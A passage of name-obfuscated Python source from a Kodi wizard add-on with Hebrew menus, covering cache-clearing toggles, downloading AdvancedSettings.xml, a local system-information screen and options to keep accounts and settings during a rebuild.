		addFile ('--- ניקוי קאש בהפעלה: %s'%O00OO0O00O00O0OO0 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O00OOO000OO00O0 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O000O0O00O000OO00 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2909
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2910
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOOOO00O0OOO00O .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2911
	if OOOOOOO00O0OOO00O =='true':#line:2912
		addFile ('--- Include All Video Addons: %s'%O000O0O0OO0O00OO0 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Bob: %s'%O0OOO0O00000000O0 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Phoenix: %s'%OO0O0O0O0OOOOOOOO .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Specto: %s'%O000OOO0OO0OO0O00 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Exodus: %s'%O000O00O0OOO00000 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Salts: %s'%OO0O0O0O00O0O0O00 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include Salts HD Lite: %s'%O0OOO000O0OO0O0O0 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include One Channel: %s'%O0OOO000O00O00O0O .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Include Genesis: %s'%OO0000O00000000O0 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2923
	setView ('files','viewType')#line:2924
def advancedWindow (url =None ):#line:2926
	if not ADVANCEDFILE =='http://':#line:2927
		if url ==None :#line:2928
			O000OOO0OOO00OO0O =wiz .workingURL (ADVANCEDFILE )#line:2929
			O0O000000OOO00000 =uservar .ADVANCEDFILE #line:2930
		else :#line:2931
			O000OOO0OOO00OO0O =wiz .workingURL (url )#line:2932
			O0O000000OOO00000 =url #line:2933
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if os .path .exists (ADVANCED ):#line:2935
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2937
		if O000OOO0OOO00OO0O ==True :#line:2938
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2939
			O00O0OOOOO0OO0O0O =wiz .openURL (O0O000000OOO00000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2940
			OOOOOOOO00OO0OOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O0OOOOO0OO0O0O )#line:2941
			if len (OOOOOOOO00OO0OOOO )>0 :#line:2942
				for OOOOO0O0OO0OOOO0O ,OO00O00OOO000O0O0 ,url ,O00O0O0OOOOOO0000 ,OOOOO00000000OO0O ,OOOOOO0000000OOOO in OOOOOOOO00OO0OOOO :#line:2943
					if OO00O00OOO000O0O0 .lower ()=="yes":#line:2944
						addDir ("[B]%s[/B]"%OOOOO0O0OO0OOOO0O ,'advancedsetting',url ,description =OOOOOO0000000OOOO ,icon =O00O0O0OOOOOO0000 ,fanart =OOOOO00000000OO0O ,themeit =THEME3 )#line:2945
					else :#line:2946
						addFile (OOOOO0O0OO0OOOO0O ,'writeadvanced',OOOOO0O0OO0OOOO0O ,url ,description =OOOOOO0000000OOOO ,icon =O00O0O0OOOOOO0000 ,fanart =OOOOO00000000OO0O ,themeit =THEME2 )#line:2947
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2948
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O000OOO0OOO00OO0O )#line:2949
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2950
def writeAdvanced (OOO0O00OOOOO00O00 ,O0O00OOO000O0O00O ):#line:2952
	OOO0O00O00O0O00O0 =wiz .workingURL (O0O00OOO000O0O00O )#line:2953
	if OOO0O00O00O0O00O0 ==True :#line:2954
		if os .path .exists (ADVANCED ):O0OOOO0O00OO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O00OOOOO00O00 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2955
		else :O0OOOO0O00OO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O00OOOOO00O00 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2956
		if O0OOOO0O00OO00O0O ==1 :#line:2958
			OO000OOO0000O000O =wiz .openURL (O0O00OOO000O0O00O )#line:2959
			OOO0OO0OO0OOO0OO0 =open (ADVANCED ,'w');#line:2960
			OOO0OO0OO0OOO0OO0 .write (OO000OOO0000O000O )#line:2961
			OOO0OO0OO0OOO0OO0 .close ()#line:2962
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2963
			wiz .killxbmc (True )#line:2964
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2965
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0O00O00O0O00O0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2966
def viewAdvanced ():#line:2968
	O0O000OOOO00OOOO0 =open (ADVANCED )#line:2969
	OO00O00OOOO0O000O =O0O000OOOO00OOOO0 .read ().replace ('\t','    ')#line:2970
	wiz .TextBox (ADDONTITLE ,OO00O00OOOO0O000O )#line:2971
	O0O000OOOO00OOOO0 .close ()#line:2972
def removeAdvanced ():#line:2974
	if os .path .exists (ADVANCED ):#line:2975
		wiz .removeFile (ADVANCED )#line:2976
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2977
def showAutoAdvanced ():#line:2979
	notify .autoConfig ()#line:2980
def getIP ():#line:2982
	OO00000OO00O0O0OO ='http://whatismyipaddress.com/'#line:2983
	if not wiz .workingURL (OO00000OO00O0O0OO ):return 'Unknown','Unknown','Unknown'#line:2984
	OO0O0OOO0OOOO0O0O =wiz .openURL (OO00000OO00O0O0OO ).replace ('\n','').replace ('\r','')#line:2985
	if not 'Access Denied'in OO0O0OOO0OOOO0O0O :#line:2986
		OO0OOOO00OO000000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO0O0OOO0OOOO0O0O )#line:2987
		O0O00O00O0OOO0O0O =OO0OOOO00OO000000 [0 ]if (len (OO0OOOO00OO000000 )>0 )else 'Unknown'#line:2988
		OO000OOO0O0O0OOO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO0O0OOO0OOOO0O0O )#line:2989
		O0OOOOOO000O00O00 =OO000OOO0O0O0OOO0 [0 ]if (len (OO000OOO0O0O0OOO0 )>0 )else 'Unknown'#line:2990
		OOOO00O00OO0OO00O =OO000OOO0O0O0OOO0 [1 ]+', '+OO000OOO0O0O0OOO0 [2 ]+', '+OO000OOO0O0O0OOO0 [3 ]if (len (OO000OOO0O0O0OOO0 )>2 )else 'Unknown'#line:2991
		return O0O00O00O0OOO0O0O ,O0OOOOOO000O00O00 ,OOOO00O00OO0OO00O #line:2992
	else :return 'Unknown','Unknown','Unknown'#line:2993
def systemInfo ():#line:2995
	O00OOO0O00000O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3009
	OO00O0OO0OO0OOO0O =[];OOOOO0OO00OO00OOO =0 #line:3010
	for OOO0OO00O00O000OO in O00OOO0O00000O0O0 :#line:3011
		OOO0OOO0O0OOO0OOO =wiz .getInfo (OOO0OO00O00O000OO )#line:3012
		O00O00O00OO0OO000 =0 #line:3013
		while OOO0OOO0O0OOO0OOO =="Busy"and O00O00O00OO0OO000 <10 :#line:3014
			OOO0OOO0O0OOO0OOO =wiz .getInfo (OOO0OO00O00O000OO );O00O00O00OO0OO000 +=1 ;wiz .log ("%s sleep %s"%(OOO0OO00O00O000OO ,str (O00O00O00OO0OO000 )));xbmc .sleep (1000 )#line:3015
		OO00O0OO0OO0OOO0O .append (OOO0OOO0O0OOO0OOO )#line:3016
		OOOOO0OO00OO00OOO +=1 #line:3017
	OOO0OOOOO0OOO0O0O =OO00O0OO0OO0OOO0O [8 ]if 'Una'in OO00O0OO0OO0OOO0O [8 ]else wiz .convertSize (int (float (OO00O0OO0OO0OOO0O [8 ][:-8 ]))*1024 *1024 )#line:3018
	OO0O00OOOOOO0OOO0 =OO00O0OO0OO0OOO0O [9 ]if 'Una'in OO00O0OO0OO0OOO0O [9 ]else wiz .convertSize (int (float (OO00O0OO0OO0OOO0O [9 ][:-8 ]))*1024 *1024 )#line:3019
	OO0000OOOO00O0OO0 =OO00O0OO0OO0OOO0O [10 ]if 'Una'in OO00O0OO0OO0OOO0O [10 ]else wiz .convertSize (int (float (OO00O0OO0OO0OOO0O [10 ][:-8 ]))*1024 *1024 )#line:3020
	O00OOOOO0O0O0O00O =wiz .convertSize (int (float (OO00O0OO0OO0OOO0O [11 ][:-2 ]))*1024 *1024 )#line:3021
	O000000OOO0O0OO0O =wiz .convertSize (int (float (OO00O0OO0OO0OOO0O [12 ][:-2 ]))*1024 *1024 )#line:3022
	OOO00OO00OOOO0OOO =wiz .convertSize (int (float (OO00O0OO0OO0OOO0O [13 ][:-2 ]))*1024 *1024 )#line:3023
	O0000OO0OO00O00OO ,O000000000OO0OOOO ,OO0O0OO0OOO00O0O0 =getIP ()#line:3024
	OO0OO00O000O000OO =[];OOOOOO0O00OO0O0OO =[];OO000O00O0OO000OO =[];OO0000O0OOOOOO000 =[];O0000OO0OOOO0OOO0 =[];OOOO00OO0O000OO0O =[];OO00000O00OO00OOO =[]#line:3026
	OO00OO0OOOOOO0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3028
	for OOO0O0O00000OOOO0 in sorted (OO00OO0OOOOOO0OOO ,key =lambda OOOOO0O0O0OOO0O00 :OOOOO0O0O0OOO0O00 ):#line:3029
		OO0OO00O0OO000000 =os .path .split (OOO0O0O00000OOOO0 [:-1 ])[1 ]#line:3030
		if OO0OO00O0OO000000 =='packages':continue #line:3031
		OO00OOOOOO0OO0OOO =os .path .join (OOO0O0O00000OOOO0 ,'addon.xml')#line:3032
		if os .path .exists (OO00OOOOOO0OO0OOO ):#line:3033
			O00O0OOO00O0OOO0O =open (OO00OOOOOO0OO0OOO )#line:3034
			O0OO0O000OO0000O0 =O00O0OOO00O0OOO0O .read ()#line:3035
			OOOOO00000O0OOO0O =re .compile ("<provides>(.+?)</provides>").findall (O0OO0O000OO0000O0 )#line:3036
			if len (OOOOO00000O0OOO0O )==0 :#line:3037
				if OO0OO00O0OO000000 .startswith ('skin'):OO00000O00OO00OOO .append (OO0OO00O0OO000000 )#line:3038
				if OO0OO00O0OO000000 .startswith ('repo'):O0000OO0OOOO0OOO0 .append (OO0OO00O0OO000000 )#line:3039
				else :OOOO00OO0O000OO0O .append (OO0OO00O0OO000000 )#line:3040
			elif not (OOOOO00000O0OOO0O [0 ]).find ('executable')==-1 :OO0000O0OOOOOO000 .append (OO0OO00O0OO000000 )#line:3041
			elif not (OOOOO00000O0OOO0O [0 ]).find ('video')==-1 :OO000O00O0OO000OO .append (OO0OO00O0OO000000 )#line:3042
			elif not (OOOOO00000O0OOO0O [0 ]).find ('audio')==-1 :OOOOOO0O00OO0O0OO .append (OO0OO00O0OO000000 )#line:3043
			elif not (OOOOO00000O0OOO0O [0 ]).find ('image')==-1 :OO0OO00O000O000OO .append (OO0OO00O0OO000000 )#line:3044
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3049
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3051
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOO0OOO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00OOOOOO0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOOO00O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOO0O0O0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000OOO0O0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO00OOOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0OO00O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000000OO0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OO0OOO00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO0OO0OOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	OO000O00OO00O0000 =len (OO0OO00O000O000OO )+len (OOOOOO0O00OO0O0OO )+len (OO000O00O0OO000OO )+len (OO0000O0OOOOOO000 )+len (OOOO00OO0O000OO0O )+len (OO00000O00OO00OOO )+len (O0000OO0OOOO0OOO0 )#line:3074
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO000O00OO00O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000O00O0OO000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0000O0OOOOOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO0O00OO0O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO00O000O000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000OO0OOOO0OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00000O00OO00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO00OO0O000OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3082
def Menu ():#line:3083
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3084
def saveMenu ():#line:3086
	OOO0000OO0000O0O0 ='[COLOR yellow]מופעל[/COLOR]';O00OOOOOO0O00O0O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3088
	OO000O00OOOOO00O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3089
	OO000OOO0O0OOO000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3090
	O00OOOOOO0O000OO0 ='true'if KEEPINFO =='true'else 'false'#line:3091
	O00OOO000O000O000 ='true'if KEEPSOUND =='true'else 'false'#line:3093
	O0OOO00OOOOOOOOOO ='true'if KEEPVIEW =='true'else 'false'#line:3094
	O0000O0O0O0O00OOO ='true'if KEEPSKIN =='true'else 'false'#line:3095
	O00O0000O000OOO0O ='true'if KEEPSKIN2 =='true'else 'false'#line:3096
	O000OO000O0O00OO0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3097
	O000OOOOOOO0O0000 ='true'if KEEPADDONS =='true'else 'false'#line:3098
	OOOOO0OOOO0O0000O ='true'if KEEPPVR =='true'else 'false'#line:3099
	OOO00O00000OOOOOO ='true'if KEEPTVLIST =='true'else 'false'#line:3100
	O00OO00000OOOO00O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3101
	OO0O000O0OO00O0OO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3102
	OOO0OOO0O0000OO0O ='true'if KEEPHUBTV =='true'else 'false'#line:3103
	OOO0O000O0OOO0000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3104
	OOO0OOOOOO00O00O0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3105
	O00O0O000OO0O0O00 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3106
	O00OO0O00OO0OO0O0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3107
	OO00OO0OOOOOOO0O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3108
	O00000OOOOO00O00O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3109
	O0O00OOOOO000OOOO ='true'if KEEPTRAKT =='true'else 'false'#line:3110
	O00O000O00OOOOOOO ='true'if KEEPREAL =='true'else 'false'#line:3111
	O0O0000OOOOOOO0OO ='true'if KEEPRD2 =='true'else 'false'#line:3112
	OO0O0OOOO00OO00OO ='true'if KEEPTORNET =='true'else 'true'#line:3113
	OO000O000O0000OO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3114
	O0OO000O000000O0O ='true'if KEEPSOURCES =='true'else 'false'#line:3115
	O00O000OOOO00OO00 ='true'if KEEPADVANCED =='true'else 'false'#line:3116
	O0000OOO00O0O000O ='true'if KEEPPROFILES =='true'else 'false'#line:3117
	O00OO00OO0000O0O0 ='true'if KEEPFAVS =='true'else 'false'#line:3118
	OO0OO00OO0O0OO000 ='true'if KEEPREPOS =='true'else 'false'#line:3119
	O0OO0OO0000O00OO0 ='true'if KEEPSUPER =='true'else 'false'#line:3120
	OO0O00OOO0O0OOOO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3121
	O0OOO0O0O0O00OOOO ='true'if KEEPWEATHER =='true'else 'false'#line:3122
	O0O000OO0OO00OOOO ='true'if KEEPVICTORY =='true'else 'false'#line:3123
	O0OO0O00OOOO0000O ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3124
	if OO0O00OOO0O0OOOO0 =='true':#line:3126
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3128
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3129
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3130
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון RD:  '%O00O000O00OOOOOOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון טראקט:  '%O0O00OOOOO000OOOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת מועדפים:  '%O00OO00OO0000O0O0 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOOO0OOOO0O0000O .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0O000OO0OO00OOOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת חשבון טלמדיה:  '%O0OO0O00OOOO0000O .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOO00O00000OOOOOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח סרטים:  '%O00OO00000OOOO00O .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח סדרות:  '%OO0O000O0OO00O0OO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח טלויזיה:  '%OOO0OOO0O0000OO0O .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOO0O000O0OOO0000 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח ספורט:  '%OOO0OOOOOO00O00O0 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח ילדים:  '%O00O0O000OO0O0O00 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת אריח מוסיקה:  '%O00OO0O00OO0OO0O0 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO00OO0OOOOOOO0O0 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת כל האריחים בסקין:  '%O0000O0O0O0O00OOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0OOO0O0O0O00OOOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O000OOOOOOO0O0000 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
